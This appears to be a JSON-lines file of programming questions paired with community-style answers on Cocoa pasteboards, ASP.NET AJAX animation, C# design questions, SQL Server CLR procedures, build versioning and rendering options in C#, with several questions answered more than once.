{"instruction": "Is there a way to unfilter an NSPasteboard for what the source application specifically declared it would provide?\nI'm attempting to serialize pasteboard data in my application.  When another application places an RTF file on a pasteboard and then I ask for the available types, I get eleven different flavors of said RTF, everything from the original RTF to plain strings to dyn.* values.  \nSaving off all that data into a plist or raw data on disk isn't usually a problem as it's  pretty small, but when an image of any considerable size is placed on the pasteboard, the resulting output can be tens of times larger than the source data (with multiple flavors of TIFF and PICT data being made available via filtering).\nI'd like to just be able to save off what the original app made available if possible.\n\nJohn, you are far more observant than myself or the gentleman I work with who's been doing Mac programming since dinosaurs roamed the earth.  Neither of us ever noticed the text you highlighted... and I've not a clue why.  Starting too long at the problem, apparently.\nAnd while I accepted your answer as the correct answer, it doesn't exactly answer my original question.  What I was looking for was a way to identify flavors that can become  other flavors simply by placing them on the pasteboard AND to know which of these types were originally offered by the provider.  While walking the types list will get me the preferred order for the application that provided them, it won't tell me which ones I can safely ignore as they'll be recreated when I refill the pasteboard later.\nI've come to the conclusion that there isn't a \"good\" way to do this.  [NSPasteboard declaredTypesFromOwner] would be fabulous, but it doesn't exist.", "output": "-[NSPasteboard types] will return all the available types for the data on the clipboard, but it should return them \"in the order they were declared.\"\nThe documentation for -[NSPasteboard declareTypes:owner:] says that \"the types should be ordered according to the preference of the source application.\"\nA properly implemented pasteboard owner should, therefore, declare the richest representation of the content (probably the original content) as the first type; so a reasonable single representation should be:\n[pb dataForType:[[pb types] objectAtIndex:0]]"}
{"instruction": "I have just started working with the AnimationExtender.  I am using it to show a new div with a list gathered from a database when a button is pressed.  The problem is the button needs to do a postback to get this list as I don't want to make the call to the database unless it's needed.  The postback however stops the animation mid flow and resets it.  The button is within an update panel.\nIdeally I would want the animation to start once the postback is complete and the list has been gathered.  I have looked into using the ScriptManager to detect when the postback is complete and have made some progress.  I have added two javascript methods to the page.\nfunction linkPostback() {\n\n        var prm = Sys.WebForms.PageRequestManager.getInstance();\n        prm.add_endRequest(playAnimation)\n    }\n\n    function playAnimation() {\n        var onclkBehavior = $find(\"ctl00_btnOpenList\").get_OnClickBehavior().get_animation();\n        onclkBehavior.play();\n    }\n\nAnd I\u2019ve changed the btnOpenList.OnClientClick=\u201dlinkPostback();\u201d\nThis almost solves the problem.  I\u2019m still get some animation stutter.  The animation starts to play before the postback and then plays properly after postback.  Using the onclkBehavior.pause() has no effect.  I can get around this by setting the AnimationExtender.Enabled = false and setting it to true in the buttons postback event.  This however works only once as now the AnimationExtender is enabled again.  I have also tried disabling the AnimationExtender via javascript but this has no effect.\nIs there a way of playing the animations only via javascript calls?  I need to decouple the automatic link to the \nbuttons click event so I can control when the animation is fired.\nHope that makes sense.\nThanks\nDG", "output": "The flow you are seeing is something like this:\n\nClick on button\nAnimationExtender catches action and call clickOn callback\nlinkPostback starts asynchronous request for page and then returns flow to AnimationExtender\nAnimation begins\npageRequest returns and calls playAnimation, which starts the animation again\n\nI think there are at least two ways around this issue.  It seems you have almost all the javascript you need, you just need to work around AnimationExtender starting the animation on a click.\nOption 1: Hide the AnimationExtender button and add a new button of your own that plays the animation.  This should be as simple as setting the AE button's style to \"display: none;\" and having your own button call linkPostback().\nOption 2: Re-disable the Animation Extender once the animation has finished with.  This should work, as long as the playAnimation call is blocking, which it probably is:\nfunction linkPostback() {\n\n    var prm = Sys.WebForms.PageRequestManager.getInstance();\n    prm.add_endRequest(playAnimation)\n}\n\nfunction playAnimation() {\n\n    AnimationExtender.Enabled = true;\n    var onclkBehavior = $find(\"ctl00_btnOpenList\").get_OnClickBehavior().get_animation();\n    onclkBehavior.play();\n    AnimationExtender.Enabled = false;\n}\n\nAs an aside, it seems your general approach may face issues if there is a delay in receiving the pageRequest.  It may be a bit weird to click a button and several seconds later have the animation happen.  It may be better to either pre-load the data, or to pre-fill the div with some \"Loading...\" thing, make it about the right size, and then populate the actual contents when it arrives."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "I like to use continue at the beginning of loops for handling simple if conditions.\nTo me it makes the code more readable since there is not extra nesting and you can see that I have explicitly dealt with these cases.\nIs this the same reason that I would use a goto?  Perhaps.  I do use them for readability at times and to stop the nesting of code but I usually use them more for cleanup/error handling."}
{"instruction": "Say instead of returning void a method you returned a reference to the class even if it didn't make any particular semantic sense.  It seems to me like it would give you more options on how the methods are called, allowing you to use it in a fluent-interface-like style and I can't really think of any disadvantages since you don't have to do anything with the return value (even store it).\nSo suppose you're in a situation where you want to update an object and then return its current value.\ninstead of saying \nmyObj.Update();\nvar val = myObj.GetCurrentValue();\n\nyou will be able to combine the two lines to say\nvar val = myObj.Update().GetCurrentValue();\n\n\nEDIT:  I asked the below on a whim, in retrospect, I agree that its likely to be unnecessary and complicating, however my question regarding returning this rather than void stands.\nOn a related note, what do you guys think of having the language include a new bit of syntactic sugar:\nvar val = myObj.Update()<.GetCurrentValue();\n\nThis operator would have a low order of precedence so myObj.Update() would execute first and then call  GetCurrentValue() on myObj instead of the void return of Update.\nEssentially I'm imagining an operator that will say \"call the method on the right-hand side of the operator on the first valid object on the left\".  Any thoughts?", "output": "At first sight it may look good, but for a consistent interface you will need that all methods return a reference to this (which has it own problems).\nLet say you have a class with two methods GetA which return this and GetB which return another object:\nThen you can call obj.GetA().GetB(), but not obj.GetB().GetA(), which at least doesn't seems consistent.\nWith Pascal (and Visual Basic) you can call several methods of the same object.\n\nwith obj\n  .GetA();\n  .GetB();\nend with;\n\n\nThe problem with this feature is that you easily can write code that is harder to understand than it should be. Also adding a new operator probably make it ever harder."}
{"instruction": "I am using VS 2008 with SP1 and the IE 8 beta 2. Whenever I start a new Web site or when I double-click an ASPX in the solution explorer, VS insists on attempting to the display the ASPX page in a free-standing IE browser instance. The address is the local file path to the ASPX it's trying to load and an error that says, \"The XML page cannot be displayed\" is shown. \nOtherwise, things work work correctly (I just close the offending browser window. ASP.NET is registered with IIS and I have no other problems. I have tested my same configuration on other PCs and it works fine. Has anyone had this problem? \nThanks\nrp", "output": "Could it be that VS is not the default editor for ASPX files?"}
{"instruction": "I am using VS 2008 with SP1 and the IE 8 beta 2. Whenever I start a new Web site or when I double-click an ASPX in the solution explorer, VS insists on attempting to the display the ASPX page in a free-standing IE browser instance. The address is the local file path to the ASPX it's trying to load and an error that says, \"The XML page cannot be displayed\" is shown. \nOtherwise, things work work correctly (I just close the offending browser window. ASP.NET is registered with IIS and I have no other problems. I have tested my same configuration on other PCs and it works fine. Has anyone had this problem? \nThanks\nrp", "output": "Right click on the file, select 'Open With' and choose \"Web Form Editor\" and click \"Set as Default\"."}
{"instruction": "Should developers avoid using continue in C# or its equivalent in other languages to force the next iteration of a loop? Would arguments for or against overlap with arguments about Goto?", "output": "Others have hinted at it... but continue and break are enforced by the compiler and have their own associated rules. Goto has no such limitations, though the net effect might almost be the same, in some circumstances.\nI do not consider continue or break to be harmful per se, though I'm sure either can be used poorly in a way that would make any sane programmer gag."}
{"instruction": "Best practices recommend not installing Sql Server to run as SYSTEM.  What is the bare minumum you need to give the user account you create for it?", "output": "Typically I create a Domain User with only the specific rights on the network which I will require the server to have (i.e. to write to the network backup drive), I then add the account to local power users or local administrators depending on what needs to be done on the machine, however this isn't required.  I've installed SQL a number of times using a standard user as a Service Account but you need to ensure that the user has access to write to the resources as listed at http://support.microsoft.com/default.aspx?scid=kb;en-us;Q283811 .  Its probably not as defined an answer as you wanted but I'm only a developer (not a professional DBA / System Engineer).\nMauro\nPS dont downmark me for saying \"only a developer\" :P"}
{"instruction": "I have a wrapper around a C++ function call which I call from C# code. How do I attach a debugger in Visual Studio to step into the native C++ code?\nThis is the wrapper that I have which calls GetData() defined in a C++ file:\n    [DllImport(\"Unmanaged.dll\", CallingConvention=CallingConvention.Cdecl, \n               EntryPoint = \"GetData\", BestFitMapping = false)]\n        public static extern String GetData(String url);\n\nThe code is crashing and I want to investigate the root cause.\nThanks,\nNikhil", "output": "Check the Debug tab on your project's properties page. There should be an \"Enable unmanaged code debugging\" checkbox. This worked for me when we developed a new .NET UI for  our old c++ DLLs.\nIf your unmanaged DLL is being built from another project (for a while ours were being built using VS6) just make sure you have the DLL's pdb file handy for the debugging.\nThe other approach is to use the C# exe as the target exe to run from the DLL project, you can then debug your DLL normally."}
{"instruction": "I have a wrapper around a C++ function call which I call from C# code. How do I attach a debugger in Visual Studio to step into the native C++ code?\nThis is the wrapper that I have which calls GetData() defined in a C++ file:\n    [DllImport(\"Unmanaged.dll\", CallingConvention=CallingConvention.Cdecl, \n               EntryPoint = \"GetData\", BestFitMapping = false)]\n        public static extern String GetData(String url);\n\nThe code is crashing and I want to investigate the root cause.\nThanks,\nNikhil", "output": "in addition to Lou's advise for starting the debugger, you can select which debug engines are used when attaching to an existing process by clicking on 'Select...' in the 'attach to process' dialog and choosing both 'managed code' and 'native code'.\nDebugging in this way is called mixed mode debugging.  See this blog post for some tips.\nI believe this isn't supported for 64 bit processes ... though would love to be wrong on that point."}
{"instruction": "Are there any tools to facilitate a migration from Sourcegear's Vault to Subversion?\nI'd really prefer an existing tool or project (I'll buy!).\nRequirements:\n\nOne-time migration only\nFull history with comments\n\nOptional:\n\nSome support for labels/branches/tags\nRelatively speedy. It can take hours but not days.\nCost if available\n\nBonus points if you can share personal experience related to this process.\n\nOne of the reasons I'd like to do this is because we have lots of projects spread between Vault and Subversion (we're finally away from sourcesafe). It'd be helpful in some situations to be able to consolidate a particular customer's repos to SVN.\nAdditionally, SVN is better supported among third party tools. For example, Hudson and Redmine.\nAgain, though: we're not abandoning vault altogether.", "output": "If you want full version history, you may want to just write a script that checks out each version from vault and checks it in with the comments to Subversion.\nhttp://www.selenic.com/mercurial/wiki/index.cgi/GenericConversion is a good example\nBased on the documentation that I saw on the Vault website, look into the command line GETVERSION.\nUse your favorite scripting language...\nImplement the following process:\n\nCheck out a version from vault.\nGet the commit comments for the changeset.\nAdd/remove the files to the SVN repo\nCommit files using the commit comments\nGo back to step one with the next version"}
{"instruction": "After attending a recent Alt.NET group on IoC, I got to thinking about the tools available and how they might work.  StructureMap in particular uses both attributes and bootstrapper concepts to map requests for IThing to ConcreteThing.  Attributes automatically throw up flags for me that either reflection or IL injection is going on.  Does anyone know exactly how this works (for StructureMap or other IoC tools) and what the associated overhead might be either at run-time or compile-time?", "output": "I can't say much for other IoC toolkits but I use Spring.Net and have found that there is a one off initial performance penalty at startup. Once the container has been configured the application runs unaffected."}
{"instruction": "After attending a recent Alt.NET group on IoC, I got to thinking about the tools available and how they might work.  StructureMap in particular uses both attributes and bootstrapper concepts to map requests for IThing to ConcreteThing.  Attributes automatically throw up flags for me that either reflection or IL injection is going on.  Does anyone know exactly how this works (for StructureMap or other IoC tools) and what the associated overhead might be either at run-time or compile-time?", "output": "They major problem is that code becomes hard to understand. It might become pure magical if one overuse IoC. Another problem is performance. In most cases performance lost is not noticeable. But when you start creating most of your objects via IoC container, it can suddenly drop below ocean level."}
{"instruction": "I run a rather complex project with several independent applications. These use however a couple of shared components. So I have a source tree looking something like the below.\n\nMy Project \n\nApplication A\nShared1\nShared2 \nApplication B \nApplication C\n\n\nAll applications have their own MSBuild script that builds the project and all the shared resources it needs. I also run these builds on a CruiseControl controlled continuous integration build server. \nWhen the applications are deployed they are deployed on several servers to distribute load. This means that it\u2019s extremely important to keep track of what build/revision is deployed on each of the different servers (we need to have the current version in the DLL version, for example \u201c1.0.0.68\u201d). \nIt\u2019s equally important to be able to recreate a revision/build that been built to be able to roll back if something didn\u2019t work out as intended (o yes, that happends ...). Today we\u2019re using SourceSafe for source control but that possible to change if we could present good reasons for that (SS it\u2019s actually working ok for us so far). \nAnother principle that we try to follow is that it\u2019s only code that been build and tested by the integration server that we deploy further. \n\"CrusieControl Build Labels\" solution\nWe had several ideas on solving the above. The first was to have the continuous integration server build and locally deploy the project and test it (it does that now). As you probably know a successful build in CruiseControl generates a build label and I guess we somehow could use that to set the DLL version of our executables (so build label 35 would create a DLL like \u201c1.0.0.35\u201d )? The idea was also to use this build label to label the complete source tree. Then we probably could check out by that label and recreate the build later on. \nThe reason for labeling the complete tree is to include not only the actual application code (that\u2019s in one place in the source tree) but also all the shared items (that\u2019s in different places in the tree). So a successful build of \u201cApplication A\u201d would label to whole tree with label \u201cApplicationA35\u201d for example. \nThere might however be an issue when trying to recreate this build and setting the DLL version before deploying as we then don\u2019t have access to the CruiseControl generated build label anymore. If all CrusieControl build labels were unique for all the projects we could use only the number for labeling but that\u2019s not the case (both application A and B could at the same time be on build 35) so we have to include the application name in the label. Hence SourceSafe label \u201cApplication35\u201d. How can I then recreate build 34 and set 1.0.0.34 to the DLL version numbers once we built build 35?\n\"Revision number\" solution\nSomeone told me that Subversion for example creates a revision number for the entire source tree on every check in \u2013 is this the case? Has SourceSafe something similar? If this is correct the idea is then to grab that revision number when getting latest and build on the CruiseControl server. The revision number could then be used to set the DLL version number (to for example \u201c1.0.0.5678\u201d). I guess we could then get this specific revision for the Subversion if needed and that then would include that application and all the shared items to be able to recreate a specific version from the past. Would that work and could this also be achived using SourceSafe?\nSummarize\nSo the two main requirements are:\n\nBe able to track build/revision number of the build and deployed DLL.\nBe able to rebuild a past revision/build, set the old build/revision number on the executables of that build (to comply with requirement 1).\n\nSo how would you solve this? What would be your preferred approach and how would you solve it (or do you have a totally different idea?)? **Pleased give detailed answers. **\nBonus question What are the difference between a revision number and a build number and when would one really need both?", "output": "Your scheme is sound and achievable in VSS (although I would suggest you consider an alternative, VSS is really an outdated product).\nFor your \"CI\" Build - you would do the Versioning take a look at MSBuild Community Tasks Project which has a \"Version\" tasks.  Typically you will have a \"Version.txt\" in your source tree and the MSBuild task will increment the \"Release\" number while the developers control the Major.Minor.Release.Revision numbers (that's how a client of mine wanted it).  You can use revision if you prefer.\nYou then would have a \"FileUpdate\" tasks to edit the AssemblyInfo.cs file with that version, and your EXE's and \"DLL's\" will have the desired version.\nFinally the VSSLabel task will label all your files appropriately.\nFor your \"Rebuild\" Build - you would modify your \"Get\" to get files from that Label, obviously not execute the \"Version\" task (as you are SELECTING a version to build) and then the FileUpdate tasks would use that version number.\nBonus question:\nThese are all \"how you want to use them\" - I would use build number for, well the build number, that is what I'd increment.  If you are using CI you'll have very many builds - the vast majority with no intention of ever deploying anywhere.\nThe major and minor are self evident - but revision I've always used for a \"Hotfix\" indicator.  I intend to have a \"1.3\" release - which would in reality be a product with say 1.3.1234.0 version.  While working on 1.4 - I find a bug - and need a hot fix as 1.3.2400.1. Then when 1.4 is ready - it would be say 1.4.3500.0"}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "Are you sure the classes aren't partial classes. In which case they really aren't two classes, just a single class spread across multiple files for better readability."}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "Based on your code snippet, Posts is primarily a class of static helper methods. Posts is not the same object as Post. Instead of Posts, a better name might be PostManager or PostHelper. If you think of it that way, it may help you understand why they broke it out that way."}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "This is also an important step for a decoupling (or loosely coupling) you applications."}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "What's anti-OOP or pro-OOP depends entirely on the functionality of the software and what's needed to make it work."}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "If every method is just a static call straight to the data source, then the \"Posts\" class is really a Factory.  You could certainly put the static methods in \"Posts\" into the \"Post\" class (this is how CSLA works), but they are still factory methods.\nI would say that a more modern and accurate name for the \"Posts\" class would be \"PostFactory\" (assuming that all it has is static methods).\nI guess I wouldn't say this is a \"procedural\" approach necessarily -- it's just a misleading name, you would assume in the modern OO world that a \"Posts\" object would be stateful and provide methods to manipulate and manage a set of \"Post\" objects."}
{"instruction": "I remember back when MS released a forum sample application, the design of the application was like this:\n/Classes/User.cs\n/Classes/Post.cs\n...\n/Users.cs\n/Posts.cs\nSo the classes folder had just the class i.e. properties and getters/setters.\nThe Users.cs, Post.cs, etc. have the actual methods that access the Data Access Layer, so Posts.cs might look like:\npublic class Posts\n{\n    public static Post GetPostByID(int postID)\n    {\n          SqlDataProvider dp = new SqlDataProvider();\n          return dp.GetPostByID(postID);\n    }\n}\n\nAnother more traditional route would be to put all of the methods in Posts.cs into the class definition also (Post.cs).\nSplitting things into 2 files makes it much more procedural doesn't it?\nIsn't this breaking OOP rules since it is taking the behavior out of the class and putting it into another class definition?", "output": "Well it depends where and how you define your separation of concerns. If you put the code to populate the Post in the Post class, then your Business Layer is interceded with Data Access Code, and vice versa. \nTo me it makes sense to do the data fetching and populating outside the actual domain object, and let the domain object be responsible for using the data."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "In general you use the CLR if you have something that doesn't need to interface with the database much.  So let's say you are parsing, or decoding a value. This is easier to do in the CLR and then return the value.\nTrying to do a compelx query in the CLR is just not the way to go.\nBTW this didn't change in 2008 either."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "CLR stored procedures are not meant to replace set-based queries.  If you need to query the database, you are still going to need to put SQL into your CLR code, just as if it was embedded in regular code.  This would be a waste of effort.\nCLR stored procedures are for two main things: 1) interaction with the OS, such as reading from a file or dropping a message in MSMQ, and 2) performing complex calculations, especially when you already have the code written in a .NET language to do the calculation."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "There are places for both well-written, well-thought-out T-SQL and CLR. If some function is not called frequently and if it required extended procedures in SQL Server 2000, CLR may be an option. Also running things like calculation right next to the data may be appealing. But solving bad programmers by throwing in new technology sounds like a bad idea."}
{"instruction": "Are there any other way to render graphics in C# beyond GDI+ and XNA? (For the development of a tile map editor)", "output": "http://cs-sdl.sourceforge.net/index.php/Main_Page is the solution I've come to love.  If you need 3d on top of it, you can use Tao.OpenGL to render inside it.  It's fast, industry standard (SDL, that is), and cross-platform."}
{"instruction": "Grails scaffolding defaults to 10 rows per page.  I would like to increase that number without generating the views and changing the 10 in every file.  Where do I change the default?", "output": "I found this but can't get it to work.  You're supposed to be able (according to this) to scaffold and then override the actions you want (say list) in your controller, but like I said, it doesn't work for me...\nclass PersonController {\n  def scaffold = true\n\n  def list = {\n\tif(!params.max) params.max = 20\n\t[ personList: Person.list( params ) ]\n  }\n}"}
{"instruction": "Are there any other way to render graphics in C# beyond GDI+ and XNA? (For the development of a tile map editor)", "output": "Yes, I have written a Windows Forms control that wraps DirectX 9.0 and provides direct pixel level manipulation of the video surface.  \nI actually wrote another post on StackOverflow asking if there are other better approaches: Unsafe C# and pointers for 2d rendering, good or bad?\nWhile it is relatively high performance, it requires the unsafe compiler option as it uses pointers to access the memory efficiently.  Hence the reason for this earlier post.\nThis is a high level of the required steps:\n\nDownload the DirectX SDK.\nCreate a new C# winforms project and reference the installed\nMicrosoft DirectX assembly.\nInitialize a new DirectX Device object with Presentation Parameters\n(windowed, back buffering etc) you\nrequire.\nCreate the Device, taking care to record the surface \"Pitch\" and\ncurrent display mode (bits per\npixel).\nWhen you need to display something, Lock the backbuffer\nsurface and store the returned\npointer to the start of surface\nmemory.\nUse pointer arithmetic, calculate the actual pixel position in the\ndata based on the surface pitch,\nbits per pixel and the actual x/y\npixel coordinate.\nIn my case for simplicity I am sticking to 32bpp, meaning setting a\npixel is as simple as:  *(surfacePointer + (y * pitch + x))=Color.FromARGB(255,0,0);\nWhen finished drawing, Unlock the back buffer surface. Present the surface.\nRepeat from step 5 as required.\n\nBe aware that taking this approach you need to be very careful about checking the current display mode (pitch and bits per pxiel) of the target surface.  Also you will need to have a strategy in place to deal with window resizing or changes of screen format while your program is running."}
{"instruction": "Was considering the System.Collections.ObjectModel ObservableCollection<T> class. This one is strange because  \n\nit has an Add Method which takes one item only. No AddRange or equivalent. \nthe Notification event arguments has a NewItems property, which is a IList (of objects.. not T)\n\nMy need here is to add a batch of objects to a collection and the listener also gets the batch as part of the notification. Am I missing something with ObservableCollection ? Is there another class that meets my spec?\nUpdate: Don't want to roll my own as far as feasible. I'd have to build in add/remove/change etc.. a whole lot of stuff.\n\nRelated Q:\nhttp://stackoverflow.com/questions/670577/observablecollection-doesnt-support-addrange-method-so-i-get-notified-for-each", "output": "Not only is System.Collections.ObjectModel.Collection<T> a good bet, but in the help docs there's an example of how to override its various protected methods in order to get notification.  (Scroll down to Example 2.)"}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "It always comes down to the right tool for the job, so it really depends on what you are trying to accomplish.  \nHowever, as a general rule, you're right that CLR procs have a greater overhead and will never perform on set operations like T-SQL. My guideline is do it all in T-SQL unless what you need becomes overly complicated in T-SQL. Then, try harder to get the T-SQL approach to work.  :-)  \nCLR procs are great and do have their place, but their use should be the exception, not the rule."}
{"instruction": "Are there any other way to render graphics in C# beyond GDI+ and XNA? (For the development of a tile map editor)", "output": "You could try looking into WPF, using Visual Studio and/or Expression Blend. I'm not sure how sophisticated you're trying to get, but it should be able to handle a simple editor.  Check out this MSDN Article for more info."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "Hosting the CLR within SQL Server is meant to give database developers more flexible options in how they sought to accomplish tasks. Like others have mentioned, SQL is great for operations and modifications on sets of data. Anybody who has done extensive large application development with complex business/domain rules would likely tell you - trying to enforce some of these rules using pure SQL (some times into a single macro query) can get truly nightmarish.\nThere are just certain tasks that are better handled in a procedural or OO fashion. By having the choice of using .NET code to break down the sequence of logic, query operations can get easier to read and debug. Having used CLR stored procs I can tell you stepping through with the debugger really makes it easier to follow through with what is happening at the database level.\nJust one example, we frequently use CLR stored procs here as a \"gateway\" for dynamic search queries. Say a search request that can have up to 30 different search parameters. Users obviously don't use all 30 of them, so the data structure passed in will have 30 parameters but mostly DBNULL. The client side has no option to generate a dynamic statement, for obvious security reasons. The resulting dynamic statement is generated internally without fear of external \"extras\"."}
{"instruction": "My current view is no, prefer Transact SQL stored procedures because they are a lighter weight and (possibly) higher performing option, while CLR procedures allow developers to get up to all sorts of mischief.\nHowever recently I have needed to debug some very poorly written TSQL stored procs.  As usual I found many of the problems due to the original developer developer having no real TSQL experience, they were  ASP.NET / C# focused.\nSo, using CLR procedures would firstly provide a much more familiar toolset to this type of developer, and secondly, the debugging and testing facilities are more powerful (ie Visual Studio instead of SQL Management Studio).  \nI'd be very interested in hearing your experience as it's seems it is not a simple choice.", "output": "The SQL Server Books Online's page on the subject lists these benefits:\n\nA better programming model. The .NET Framework languages are in many respects richer than Transact-SQL, offering constructs and capabilities previously not available to SQL Server developers. Developers may also leverage the power of the .NET Framework Library, which provides an extensive set of classes that can be used to quickly and efficiently solve programming problems.\nImproved safety and security. Managed code runs in a common language run-time environment, hosted by the Database Engine. SQL Server leverages this to provide a safer and more secure alternative to the extended stored procedures available in earlier versions of SQL Server.\nAbility to define data types and aggregate functions. User defined types and user defined aggregates are two new managed database objects which expand the storage and querying capabilities of SQL Server.\nStreamlined development through a standardized environment. Database development is integrated into future releases of the Microsoft Visual Studio .NET development environment. Developers use the same tools for developing and debugging database objects and scripts as they use to write middle-tier or client-tier .NET Framework components and services.\nPotential for improved performance and scalability. In many situations, the .NET Framework language compilation and execution models deliver improved performance over Transact-SQL."}
{"instruction": "Are there any other way to render graphics in C# beyond GDI+ and XNA? (For the development of a tile map editor)", "output": "Managed DirectX (Microsoft.DirectX namespace) for faster 3D graphics. It's a solid .NET wrapper over DirectX API, which comes with a bit of performance hit for creating .NET objects and marshalling. Unless you are writing a full featured modern 3D engine, it will work fine.\nWindow Presentation Foundation (WPF) (Windows.Media namespace) - best choice for 2D graphics. Also has limited 3D abilities. Aimed to replace Windows Forms with vector, hardware accelerated resolution-independent framework. Very convenient, supports several flavours of custom controls, resources, data binding, events and commands... also has a few WTFs. Speed is usually faster than GDI and slower than DirectX, and depends greatly on how you do things (seen something to work 60 times faster after rewriting in a sensible way). We had a success implementing 3 1280x1024 screens full of real-time indicators, graphs and plots on a single (and not the best) PC."}
